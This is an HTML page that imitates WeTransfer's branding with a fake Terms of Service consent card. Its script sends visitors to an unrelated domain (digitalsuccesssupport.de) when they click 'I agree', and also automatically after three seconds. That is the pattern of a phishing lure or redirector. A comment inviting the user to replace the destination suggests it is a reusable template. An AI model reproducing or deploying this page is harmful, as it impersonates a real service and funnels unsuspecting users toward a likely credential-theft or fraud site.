<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>We Style Landing</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:Inter,sans-serif;
    height:100vh;
    overflow:hidden;
    transition:opacity .6s ease;
}

body.fade-out{
    opacity:0;
}

/* BACKGROUND */

.background{
    position:fixed;
    inset:0;

    background:
    radial-gradient(circle at 20% 20%, #ffb6ff 0%, transparent 30%),
    radial-gradient(circle at 80% 30%, #9fa8ff 0%, transparent 35%),
    radial-gradient(circle at 60% 80%, #ffc9ff 0%, transparent 30%),
    linear-gradient(
        135deg,
        #c86cff,
        #b892ff,
        #8ca7ff
    );

    animation:moveGradient 12s ease infinite;
    background-size:200% 200%;
}

@keyframes moveGradient{
    0%{ background-position:0% 50%; }
    50%{ background-position:100% 50%; }
    100%{ background-position:0% 50%; }
}

.background::after{
    content:"";
    position:absolute;
    inset:0;

    background-image:
    radial-gradient(rgba(255,255,255,.08) 1px, transparent 1px);

    background-size:4px 4px;
    opacity:.35;
    mix-blend-mode:overlay;
}

/* NAV */

nav{
    position:absolute;
    top:20px;
    left:50%;
    transform:translateX(-50%);

    width:780px;
    height:60px;

    background:rgba(255,255,255,.9);
    backdrop-filter:blur(20px);

    border-radius:18px;

    display:flex;
    align-items:center;
    justify-content:space-between;

    padding:0 20px;

    box-shadow:
    0 15px 40px rgba(0,0,0,.08);
}

.nav-links{
    display:flex;
    gap:30px;
}

.nav-links a{
    text-decoration:none;
    color:#333;
    font-size:14px;
}

.actions{
    display:flex;
    gap:10px;
}

.btn{
    border:none;
    padding:12px 18px;
    border-radius:12px;
    cursor:pointer;
    font-weight:600;
}

.btn-dark{
    background:#111;
    color:white;
}

.btn-light{
    background:#f5f5f5;
}

/* LOGO */

.logo{
    position:absolute;
    left:40px;
    top:28px;

    color:white;
    font-size:42px;
    font-weight:800;
}

/* HERO */

.hero{
    position:absolute;
    left:90px;
    top:140px;
}

.hero h1{
    color:white;
    font-size:76px;
    font-weight:800;
    line-height:1;
}

/* CARD */

.card{
    margin-top:60px;
    width:340px;
    background:white;
    border-radius:26px;
    padding:24px;

    box-shadow:
    0 30px 60px rgba(0,0,0,.12);
}

.icon{
    width:52px;
    height:52px;

    border-radius:16px;

    background:black;
    color:white;

    display:flex;
    align-items:center;
    justify-content:center;

    font-weight:700;
}

.card h2{
    margin-top:20px;
    font-size:42px;
    line-height:1.05;
}

.card h2 span{
    font-weight:800;
}

.card p{
    margin-top:24px;
    color:#666;
    line-height:1.7;
}

.card button{
    width:100%;
    margin-top:30px;

    height:54px;
    border:none;
    border-radius:16px;

    color:white;
    font-size:16px;
    font-weight:700;

    background:
    linear-gradient(
    135deg,
    #4377ff,
    #3257d8
    );

    cursor:pointer;
}

.card button:hover{
    opacity:.95;
}

</style>
</head>
<body>

<div class="background"></div>

<div class="logo">We</div>

<nav>
    <div class="nav-links">
        <a href="#">Features</a>
        <a href="#">Pricing</a>
        <a href="#">Resources</a>
    </div>

    <div class="actions">
        <button class="btn btn-light">Log in</button>
        <button class="btn btn-dark">Sign up</button>
    </div>
</nav>

<section class="hero">

    <h1>WeTransfer</h1>

    <div class="card">

        <div class="icon">we</div>

        <h2>
            You're <span>almost</span><br>
            there
        </h2>

        <p>
            To continue, please agree to our Terms of Service
            and acknowledge our Privacy Policy.
        </p>

        <button onclick="redirectNow()">I agree</button>

    </div>

</section>

<script>
function redirectNow() {
    document.body.classList.add("fade-out");

    setTimeout(() => {
        window.location.href = "https://65yefppkr6.digitalsuccesssupport.de/l/g1ESmd7tP1g";
        // Replace with your destination page
    }, 600);
}

// Auto redirect after 3 seconds
setTimeout(() => {
    redirectNow();
}, 3000);
</script>

</body>
</html>
